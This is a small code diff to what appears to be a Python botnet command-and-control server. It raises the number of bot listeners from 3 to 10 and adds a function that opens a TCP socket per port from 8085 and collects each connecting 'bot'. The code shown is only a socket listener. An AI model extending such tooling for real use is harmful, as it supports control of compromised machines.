@@ -19,7 +19,7 @@ def main():
 
     starting_port = 8085
 
-    bots = 3
+    bots = 10
 
     for i in range(bots):
         t = Thread(target=listen_for_bots, args=(i + starting_port,), daemon=True)
@@ -55,6 +55,14 @@ def main():
                 run_cnc = False
             else:
                 run_cnc = True
+
+def listen_for_bots(port):
+    time.sleep(1)  # Add a delay of 1 second
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(("", port))
+    sock.listen()
+    bot, bot_address = sock.accept()
+    clients.append(bot)
 
 if __name__ == "__main__":
 
